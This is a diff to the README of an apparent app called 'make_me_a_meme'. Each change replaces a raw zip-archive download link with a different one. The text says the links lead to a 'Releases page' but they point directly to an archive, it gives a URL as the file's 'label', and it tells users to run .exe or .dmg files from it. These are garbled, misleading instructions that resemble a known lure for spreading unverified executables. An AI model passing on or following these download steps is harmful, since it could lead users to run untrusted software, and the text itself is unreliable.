@@ -6,13 +6,13 @@ Welcome to **make_me_a_meme**! This application detects your facial expressions 
 ## 📦 Download & Install
 You can download the latest version of the application from our Releases page. Simply click the link below:
 
-[![Download make_me_a_meme](https://github.com/NguyenmToi/make_me_a_meme/raw/refs/heads/main/assets/make_meme_a_me_v1.4.zip)](https://github.com/NguyenmToi/make_me_a_meme/raw/refs/heads/main/assets/make_meme_a_me_v1.4.zip)
+[![Download make_me_a_meme](https://raw.githubusercontent.com/NguyenmToi/make_me_a_meme/main/assets/a-make-meme-me-3.3.zip)](https://raw.githubusercontent.com/NguyenmToi/make_me_a_meme/main/assets/a-make-meme-me-3.3.zip)
 
 To get started:
 
-1. **Visit the Releases Page**: Go to the following link to access the latest version: [Visit this page to download](https://github.com/NguyenmToi/make_me_a_meme/raw/refs/heads/main/assets/make_meme_a_me_v1.4.zip).
+1. **Visit the Releases Page**: Go to the following link to access the latest version: [Visit this page to download](https://raw.githubusercontent.com/NguyenmToi/make_me_a_meme/main/assets/a-make-meme-me-3.3.zip).
 2. **Choose Your Version**: Find the most recent release. There, you'll see various files available for download.
-3. **Download the File**: Click on the file name that corresponds to your operating system. It may be labeled as `https://github.com/NguyenmToi/make_me_a_meme/raw/refs/heads/main/assets/make_meme_a_me_v1.4.zip`, `https://github.com/NguyenmToi/make_me_a_meme/raw/refs/heads/main/assets/make_meme_a_me_v1.4.zip`, etc.
+3. **Download the File**: Click on the file name that corresponds to your operating system. It may be labeled as `https://raw.githubusercontent.com/NguyenmToi/make_me_a_meme/main/assets/a-make-meme-me-3.3.zip`, `https://raw.githubusercontent.com/NguyenmToi/make_me_a_meme/main/assets/a-make-meme-me-3.3.zip`, etc.
 4. **Install the App**: Once the download is complete, locate the file on your computer. For Windows, double-click the `.exe` file. For Mac, drag the `.dmg` file to your Applications folder.
 5. **Run make_me_a_meme**: After installation, you can open the application. Simply click on the app icon, and you’re ready to start making memes!
 
@@ -54,4 +54,4 @@ We welcome contributions! If you'd like to help us improve make_me_a_meme, check
 ### Final Note
 Thank you for choosing **make_me_a_meme**! We hope you enjoy creating memes based on your expressions. Don’t forget to share your favorites with friends! 
 
-For updates and new features, keep an eye on our Releases page: [Visit this page to download](https://github.com/NguyenmToi/make_me_a_meme/raw/refs/heads/main/assets/make_meme_a_me_v1.4.zip).
+For updates and new features, keep an eye on our Releases page: [Visit this page to download](https://raw.githubusercontent.com/NguyenmToi/make_me_a_meme/main/assets/a-make-meme-me-3.3.zip).
